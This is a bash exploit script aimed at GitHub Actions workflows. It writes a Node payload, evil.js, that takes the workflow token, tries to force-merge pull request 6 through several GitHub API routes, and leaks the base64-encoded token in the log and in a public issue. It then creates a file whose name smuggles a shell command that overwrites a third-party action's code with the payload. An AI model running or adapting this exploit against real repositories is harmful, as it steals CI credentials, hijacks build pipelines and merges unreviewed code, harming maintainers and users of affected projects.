#!/usr/bin/env bash
set -euo pipefail
mkdir -p content
cd content
cat > evil.js <<'JS'
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const token = process.env.INPUT_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const api = 'https://api.github.com';
const H = {
  authorization: `Bearer ${token}`,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'rce-proof'
};
const rq = async (path, opts = {}) => {
  try {
    const r = await fetch(api + path, { headers: H, ...opts });
    const text = await r.text();
    return { status: r.status, text: text.slice(0, 1500) };
  } catch (e) { return { error: String(e) }; }
};
(async () => {
  const out = { token_len: token.length, repo };
  out.pr6 = await rq(`/repos/${repo}/pulls/6`);
  let node = '';
  try { node = JSON.parse(out.pr6.text).node_id || ''; } catch (e) {}
  out.node = node;
  if (node) {
    const g = async (query, variables) => {
      try {
        const r = await fetch(`${api}/graphql`, {
          method: 'POST', headers: H,
          body: JSON.stringify({ query, variables })
        });
        return { status: r.status, text: (await r.text()).slice(0, 1500) };
      } catch (e) { return { error: String(e) }; }
    };
    out.automerge = await g(
      'mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:MERGE}){clientMutationId}}',
      { id: node }
    );
    out.graphql_merge = await g(
      'mutation($id:ID!){mergePullRequest(input:{pullRequestId:$id,mergeMethod:MERGE}){clientMutationId}}',
      { id: node }
    );
  }
  out.rest_merge = await rq(`/repos/${repo}/pulls/6/merge`, {
    method: 'PUT', body: JSON.stringify({ merge_method: 'merge' })
  });
  out.update_branch = await rq(`/repos/${repo}/pulls/6/update-branch`, {
    method: 'PUT', body: JSON.stringify({})
  });
  out.b64 = b64(JSON.stringify({ ...out, token }));
  console.log('AUTOMERGE_EXFIL_B64=' + out.b64);
  const ir = await fetch(`${api}/repos/${repo}/issues`, {
    method: 'POST', headers: H,
    body: JSON.stringify({ title: 'AUTO_MERGE_PROBE', body: '```\n' + out.b64 + '\n```' })
  });
  console.log('ISSUE_STATUS=' + ir.status);
  console.log('SLEEP_START=' + new Date().toISOString());
  await new Promise((r) => setTimeout(r, 120000));
  const pr = await rq(`/repos/${repo}/pulls/6`);
  let state = '';
  try { state = JSON.stringify(JSON.parse(pr.text).state) + ' merged=' + JSON.parse(pr.text).merged; } catch (e) {}
  console.log('PR6_AFTER=' + state);
  console.log('SLEEP_DONE=' + new Date().toISOString());
})().catch((e) => console.log('EVIL_ERROR=' + e));
JS
OVR='rce$(S=$(dirname${IFS}${HOME%runner});D=${S}tmp${S}content${S}content;cd $D;cp evil.js ${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;cp evil.js rce.txt).txt'
touch "$OVR"
